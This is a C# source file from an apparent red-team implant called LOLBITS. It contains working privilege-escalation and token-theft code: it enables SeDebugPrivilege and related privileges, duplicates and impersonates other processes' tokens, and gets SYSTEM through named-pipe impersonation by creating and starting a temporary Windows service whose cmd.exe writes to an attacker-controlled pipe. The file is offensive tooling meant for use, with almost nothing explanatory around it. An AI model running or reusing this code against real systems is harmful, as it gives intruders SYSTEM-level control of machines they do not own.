using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace LOLBITS
{
    public class TokenManager
    {
        public static IntPtr Token; 
        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; RunAs with valid credentials
        public static readonly string[] Credentials = new string[3]; // user - domain ('.' for local) - password 
        private static string _pipeName;
        private const int NumThreads = 1;
        private readonly SyscallManager sysCall;


        public TokenManager(SyscallManager sysCall)
        {
            Token = IntPtr.Zero;
            Method = 0;
            this.sysCall = sysCall;
        }

        public void Rev2Self()
        {
            Token = IntPtr.Zero;
            Method = 0;
        }

        public bool Impersonate (int pid)
        {
            IntPtr phandle = IntPtr.Zero;
            IntPtr ptoken = IntPtr.Zero;
            IntPtr imptoken = IntPtr.Zero;

            List<string> l = new List<string>();
            l.Add("SeDebugPrivilege");
            l.Add("SeImpersonatePrivilege");
            l.Add("SeTcbPrivilege");
            l.Add("SeAssignPrimaryTokenPrivilege");
            l.Add("SeIncreaseQuotaPrivilege");

            try
            {
                IntPtr token = IntPtr.Zero;
                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges, out token, sysCall);
                
                Utils.EnablePrivileges(token, l);

                Utils.GetProcessHandle(pid, out phandle, Utils.ProcessAccessFlags.QueryInformation);

                Utils.GetProcessToken(phandle, Utils.TokenAccessFlags.TokenDuplicate, out ptoken, sysCall);

                Utils.CloseHandle(phandle);

                Utils.TokenAccessFlags tokenAccess = Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
                   Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
                   Utils.TokenAccessFlags.TokenAdjustSessionid;

                Utils.DuplicateToken(ptoken, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation, Utils.TokenType.TokenPrimary, out imptoken);

                Utils.StartupInfo startupInfo = new Utils.StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                Utils.ProcessInformation processInfo = new Utils.ProcessInformation();


                if (Method == 0)
                    Utils.DetermineImpersonationMethod(imptoken, new Utils.LogonFlags(), startupInfo, out processInfo);

                if (Method != 0)
                {

                    Token = imptoken;
                    return true;
                }


            } catch {}

            return false;

        }

        public static bool GetSystem()
        {

            _pipeName = Jobs.RandomString(7);
            bool exit = false;
            Thread server = new Thread(ServerThread);

            string cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
            Utils.ExecuteCommand(cmd);

            server.Start();
            Thread.Sleep(250);

            cmd = "sc start NewDefaultService2";
            Utils.ExecuteCommand(cmd);



            while (!exit)
            {

                if (server.Join(250))
                    exit = true;              
                
            }

            if (Token != IntPtr.Zero)           
                return true;          
            else
            {
                cmd = "sc delete NewDefaultService2";
                Utils.ExecuteCommand(cmd);
            }

            return false;
        }

        private static void ServerThread(object data)
        {
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
            int threadId = Thread.CurrentThread.ManagedThreadId;


            // Wait for a client to connect
            pipeServer.WaitForConnection();

            try
            {
                // Read the request from the client. Once the client has
                // written to the pipe its security token will be available.

                StreamString ss = new StreamString(pipeServer);

                string filename = ss.ReadString();
                Utils fileReader = new Utils();

                pipeServer.RunAsClient(fileReader.Start);

                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
            }
            catch{}
            finally
            {
                pipeServer.Close();

            }

        }

        public bool Runas(string domain, string user, string password)
        {
            Utils.RunAs(domain, user, password);

            if (Method == 3)
                return true;

            return false;
        }
    }


    // Defines the data protocol for reading and writing strings on our stream
    public class StreamString
    {
        private readonly Stream ioStream;
        private readonly UnicodeEncoding streamEncoding;

        public StreamString(Stream ioStream)
        {
            this.ioStream = ioStream;
            streamEncoding = new UnicodeEncoding();
        }

        public string ReadString()
        {
            int len = 0;

            len = ioStream.ReadByte() * 256;
            len += ioStream.ReadByte();
            byte[] inBuffer = new byte[len];
            ioStream.Read(inBuffer, 0, len);

            return streamEncoding.GetString(inBuffer);
        }

        public int WriteString(string outString)
        {
            byte[] outBuffer = streamEncoding.GetBytes(outString);
            int len = outBuffer.Length;
            if (len > UInt16.MaxValue)
            {
                len = (int)UInt16.MaxValue;
            }
            ioStream.WriteByte((byte)(len / 256));
            ioStream.WriteByte((byte)(len & 255));
            ioStream.Write(outBuffer, 0, len);
            ioStream.Flush();

            return outBuffer.Length + 2;
        }
    }


}
